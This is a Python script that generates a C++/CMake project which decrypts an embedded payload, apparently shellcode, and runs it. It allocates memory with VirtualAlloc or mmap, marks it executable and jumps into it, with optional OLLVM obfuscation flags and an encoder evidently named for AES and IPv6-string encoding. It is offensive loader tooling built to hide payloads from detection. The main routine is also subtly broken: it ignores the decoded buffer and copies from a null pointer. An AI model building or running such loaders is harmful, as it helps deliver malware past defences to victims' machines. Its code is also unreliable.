#!/usr/bin/env python3
"""Generate a CMake project that embeds and decodes a binary payload."""

from __future__ import annotations

import argparse
import lzma
import re
import sys
import tempfile
from pathlib import Path

from .encoder import available_encoders, get_encoder

PAYLOAD_NAMESPACE = "embedded_payload"

CMAKE_TEMPLATE = r'''cmake_minimum_required(VERSION 3.16)
project(embedded_payload_decoder LANGUAGES CXX)

{packages}

add_executable(payload_decoder
    src/main.cpp
    src/payload_decoder.cpp
)
target_compile_features(payload_decoder PRIVATE cxx_std_17)
target_include_directories(payload_decoder PRIVATE include)
target_link_libraries(payload_decoder PRIVATE {libraries})

option(ENABLE_OLLVM "Enable OLLVM obfuscation for payload_decoder" OFF)
set(
    OLLVM_COMPILE_OPTIONS
    "-mllvm;-fla;-mllvm;-bcf;-mllvm;-sub"
    CACHE STRING
    "Semicolon-separated OLLVM compiler options"
)

if(ENABLE_OLLVM)
    if(NOT CMAKE_CXX_COMPILER_ID MATCHES "Clang")
        message(FATAL_ERROR "ENABLE_OLLVM requires an OLLVM-based Clang compiler")
    endif()
    target_compile_options(payload_decoder PRIVATE ${{OLLVM_COMPILE_OPTIONS}})
endif()

if(MSVC)
    target_compile_options(payload_decoder PRIVATE /W4 /permissive-)
else()
    target_compile_options(payload_decoder PRIVATE -Wall -Wextra -Wpedantic)
endif()
'''

MAIN_CPP = r'''#include "payload_decoder.h"
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#endif
#include <fstream>
#include <stdexcept>

int main(int argc, char** argv) {
    try {
        char* data = nullptr;
        std::size_t size = 0;
        embedded::PayloadBuffer payload = embedded::decode_payload(data, size);
#ifdef _WIN32
        void* exec_mem = VirtualAlloc(
            nullptr, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        );
        if (!exec_mem) return 0;

        std::memcpy(exec_mem, data, size);

        DWORD old_protect;
        if (!VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old_protect)) {
            VirtualFree(exec_mem, 0, MEM_RELEASE);
            return 0;
        }
        reinterpret_cast<void (*)()>(exec_mem)();

        if (!exec_mem) return 0;
        VirtualFree(exec_mem, 0, MEM_RELEASE);
#else
        void* exec_mem = mmap(
            nullptr, 
            size, 
            PROT_READ | PROT_WRITE, 
            MAP_PRIVATE | MAP_ANONYMOUS, 
            -1, 
            0
        );
        if (exec_mem == MAP_FAILED) return 0;

        std::memcpy(exec_mem, data, size);

        if (mprotect(exec_mem, size, PROT_READ | PROT_EXEC) != 0) {
            munmap(exec_mem, size); 
            return 0;
        }

        reinterpret_cast<void (*)()>(exec_mem)();

        if (!exec_mem) return 0;
        munmap(exec_mem, size);
#endif
        return 0;
    } catch (const std::exception&) {
        return 1;
    }
}
'''

def _parser(encoder_name: str) -> argparse.ArgumentParser:
    encoder = get_encoder(encoder_name)
    parser = argparse.ArgumentParser(
        description="Generate a cross-platform CMake project with an embedded, encrypted payload.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog=encoder.CLI_EPILOG,
    )
    parser.add_argument("input", type=Path, metavar="INPUT", help="binary file to embed")
    parser.add_argument("output", type=Path, metavar="OUTPUT_DIR", help="destination directory; it must not already exist")
    parser.add_argument(
        "--encoder",
        choices=available_encoders(),
        default="lzma-aes-ipv6",
        metavar="ENCODER",
        help="payload encoder; available choices: %(choices)s",
    )
    encoder.add_cli_arguments(parser)
    return parser


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    selector = argparse.ArgumentParser(add_help=False)
    selector.add_argument(
        "--encoder", choices=available_encoders(), default="lzma-aes-ipv6"
    )
    selected, _ = selector.parse_known_args(argv)
    return _parser(selected.encoder).parse_args(argv)


def write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8", newline="\n")


def main() -> int:
    args = parse_args()
    try:
        if not args.input.is_file():
            raise ValueError(f"input does not exist or is not a regular file: {args.input}")
        if args.output.exists():
            raise ValueError(f"output directory already exists: {args.output}")
        args.output.parent.mkdir(parents=True, exist_ok=True)
        with tempfile.TemporaryDirectory(
            prefix=f".{args.output.name}.", dir=args.output.parent
        ) as temporary:
            project = Path(temporary) / "project"
            include = project / "include"
            source = project / "src"
            include.mkdir(parents=True)
            source.mkdir(parents=True)

            encoder = get_encoder(args.encoder)
            artifacts = encoder.encode_from_cli(
                args=args,
                source=args.input.resolve(),
                output=include / "payload.h",
                namespace=PAYLOAD_NAMESPACE,
            )

            decoder = encoder.cpp_decoder(PAYLOAD_NAMESPACE)
            cmake = CMAKE_TEMPLATE.format(
                packages="\n".join(decoder.cmake_packages),
                libraries=" ".join(decoder.cmake_libraries),
            )
            write_text(project / "CMakeLists.txt", cmake)
            for name, content in artifacts.headers.items():
                write_text(include / name, content)
            write_text(include / "payload_decoder.h", decoder.header)
            write_text(source / "payload_decoder.cpp", decoder.source)
            write_text(source / "main.cpp", MAIN_CPP)
            project.rename(args.output)
    except (OSError, ValueError, lzma.LZMAError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    print(f"Generated CMake project: {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
